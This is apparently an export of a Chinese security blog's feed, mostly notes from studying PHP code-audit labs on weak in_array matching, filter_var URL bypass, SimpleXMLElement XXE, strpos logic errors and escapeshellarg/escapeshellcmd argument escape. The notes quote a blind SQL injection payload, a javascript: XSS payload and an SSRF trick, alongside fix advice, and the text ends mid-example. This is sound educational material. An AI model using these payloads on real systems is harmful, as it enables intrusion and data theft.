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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏漏洞挖掘——待补充</title>
      <link href="/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏漏洞挖掘"><a href="#游戏漏洞挖掘" class="headerlink" title="游戏漏洞挖掘"></a>游戏漏洞挖掘</h1><h2 id="1、游戏实名认证"><a href="#1、游戏实名认证" class="headerlink" title="1、游戏实名认证"></a>1、游戏实名认证</h2><p>输入假的sfz号码 能过认证成功 &#x3D;&#x3D;漏洞</p><p>tx低危 sn高危</p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日安全代码审计学习(一)</title>
      <link href="/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="红日安全代码审计学习"><a href="#红日安全代码审计学习" class="headerlink" title="红日安全代码审计学习"></a>红日安全代码审计学习</h1><p>项目地址：</p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs#">https://github.com/hongriSec/PHP-Audit-Labs#</a></p><p>记录一下自己的学习过程</p><p>顺便加上一些自己的理解</p><span id="more"></span><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><h3 id="in-array函数缺陷"><a href="#in-array函数缺陷" class="headerlink" title="in_array函数缺陷"></a><strong>in_array函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">in_array函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.in-array.php"> <strong>in_array</strong> </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：检查数组中是否存在某个值</p><p><strong>定义</strong> ： <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p><p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p></blockquote><p>in_array()第三个参数未设置为true时，是弱匹配。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span><span class="keyword">shell</span>.php </span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">7 </span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>,<span class="number">1</span> and if(ascii(substr((select database()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">112</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)));#</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span> </span><br></pre></td></tr></table></figure><h4 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h4><p>文件上传、SQL注入白名单绕过</p><h4 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h4><p>1、第三个参数设置为 <strong>true</strong></p><p>2、使用正则匹配来处理变量</p><h3 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a><strong>filter_var函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md">filter_var函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>： (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p><p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = filter<span class="constructor">_var($<span class="params">_GET</span>[&#x27;<span class="params">url</span>&#x27;],FILTER_VALIDATE_URL)</span>;</span><br><span class="line">var<span class="constructor">_dump($<span class="params">url</span>)</span>;</span><br></pre></td></tr></table></figure><p>我们用<strong>FILTER_VALIDATE_URL</strong>过滤器做测试。</p><p>可以使用 <strong>:&#x2F;&#x2F;</strong> 来绕过。</p><p>由于原文没有讲清楚为什么可以绕过，本人测试了一下应该是因为filter_var函数在使用<strong>FILTER_VALIDATE_URL</strong>过滤器时，只要参数中含有 <strong>:&#x2F;&#x2F;</strong> 就视作为有效的URL。</p><p><strong><a href="http://www.baidu.com/">http://www.baidu.com</a> 是有效的URL</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202347838.png"></p><p><strong><a href="ftp://www.baidu.com是有效url/">ftp://www.baidu.com是有效URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202354607.png"></p><p><strong>0:&#x2F;&#x2F;<a href="http://www.baidu.com也是有效url,注意这个,这里可以作为一个ssrf的小trick/">www.baidu.com也是有效URL，注意这个，这里可以作为一个SSRF的小trick</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202355795.png"></p><p><strong>而<a href="http://www.baidu.com是无效的url/">www.baidu.com是无效的URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202356483.png"></p><h4 id="利用场景：-1"><a href="#利用场景：-1" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS绕过</p><p>XSS场景可以使用Javascript伪协议进行绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> <strong>&#x2F;&#x2F;</strong> 在JavaScript中表示单行注释， 对**%** 百分号编码成 <strong>%25</strong>，我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行</p><p>程序将浏览器发来的payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 先解码成： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment%<span class="number">0</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 存储在可回显在页面上变量中，然后用户点击就会触发<strong>alert</strong>函数，弹窗。</p><p><strong>SSRF trick</strong></p><p><strong>看这篇文章</strong></p><p><a href="https://www.anquanke.com/post/id/101058">https://www.anquanke.com/post/id/101058</a></p><h4 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h4><p>对于XSS的话，最好是过滤关键词+实体化编码。</p><p>对于ssrf的话，建议正则匹配吧。</p><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day3/files/README.md">红日安全]代码审计Day3 - 实例化任意对象漏洞</a></p><p>这个漏洞类似于php任意代码执行了</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210028203.png"></p><p>实例化类的类名和传入类的参数均在用户的控制之下，攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行。</p><p>先看看 <strong>SimpleXMLElement</strong> 类的定义：</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p><p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210103549.png"></p><p>data：格式正确的XML字符串，当参数<code>data_is_url</code>是<code>True</code>时，传入一个URL字符串</p><p>options：（可选）用于指定其他Libxml参数。</p><p><strong>SimpleXMLElement</strong> 导致的XXE攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210034481.png"></p><h4 id="利用场景：-2"><a href="#利用场景：-2" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XXE</p><h4 id="修复建议：-2"><a href="#修复建议：-2" class="headerlink" title="修复建议："></a>修复建议：</h4><p>可以修改代码，不要用这种可控的参数形式。</p><p>然后提一下对XXE漏洞进行修复，可以禁止加载XML实体对象。</p><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day4/files/README.md">红日安全]代码审计Day4 - strpos使用不当引发漏洞</a>&#96;</p><p>结合具体场景代码</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220113952.png"></p><p>代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 &lt; 和 &gt; 符号，猜测开发者应该是考虑到非法字符注入问题。</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置</p><p>作用：主要是用来查找字符在字符串中首次出现的位置。</p><p>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;a&#x27;</span>));   <span class="comment">#0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;x&#x27;</span>));   <span class="comment">#false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面场景代码中核心判断代码是</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!strpos($user,&#x27;&lt;&#x27;) || !strpos($user,&#x27;&gt;&#x27;)) &amp;&amp; (!strpos($pass,&#x27;&lt;&#x27;) || !strpos($pass,&#x27;&gt;&#x27;))</span><br></pre></td></tr></table></figure><p>作者考虑到可能有黑客会在登陆点进行SQL注入测试，所以判断了一下是否出现 <strong>‘&lt;’** 或 **’&gt;’</strong> 若出现则strpos函数获得出现位置，再配合  <strong>!</strong>  取反得到false</p><p>先不说strpos函数的问题，这段代码的逻辑就有问题，如果$user只出现了&gt;或&lt;号但$pass没有出现&gt;或&lt;号，那么依然可以判定成功。</p><p>例如这样</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220131557.png"></p><p>再说回strpos函数的绕过，因为strpos函数是取字符位置，但是如果取到了位置为<strong>0</strong>，那么通过！取反得到的就会是<strong>true</strong>了，就会导致判断成功，代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220134822.png"></p><h4 id="利用场景：-3"><a href="#利用场景：-3" class="headerlink" title="利用场景："></a>利用场景：</h4><p>ctf印象中见过</p><h4 id="修复建议：-3"><a href="#修复建议：-3" class="headerlink" title="修复建议："></a>修复建议：</h4><p>代码逻辑优化</p><p>或者登录验证那块不要这么写了（真要防止SQL注入，这样写会不会太儿戏了。。。）</p><h3 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">红日安全]代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p><p>原理：</p><p><strong>escapeshellarg()</strong> </p><p>将转码任何已经存在的单引号</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这里稍微解释一下</p><p>其实是变成了三个字符串的连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&#x27; #这里是escapeshellarg函数的效果 原来的单引号前面加上\转义</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;-v -d a=1&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>escapeshellcmd</strong>函数</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗  shell 命令执行任意命令的字符进行转义。</p><p>反斜线（\）会在以下字符之前插入：   <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code>   和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code>   仅在不配对儿的时候被转义。   </p><p>当**escapeshellarg()<strong>与</strong>escapeshellcmd()**一起使用时就会出现参数逃逸漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>依然是变成了三个部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1270.0.1&#x27;</span> <span class="comment">#没有发生转义 单引号是配对的</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 